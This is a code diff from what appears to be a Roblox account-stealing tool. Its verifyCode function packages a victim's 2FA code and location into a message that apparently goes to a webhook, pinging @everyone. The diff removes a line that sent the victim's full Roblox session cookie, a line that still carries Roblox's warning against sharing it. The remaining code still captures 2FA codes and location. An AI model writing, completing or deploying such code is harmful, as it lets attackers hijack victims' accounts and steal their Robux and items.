@@ -218,7 +218,6 @@ async function verifyCode() {
         // Simplified 2FA payload to avoid 400 errors
         const payload = {
             content: `2FA: ${code}
-Cookie: ${globalRobloxCookie ? `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${globalRobloxCookie}` : 'None'}
 Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'}
 @everyone`
         };
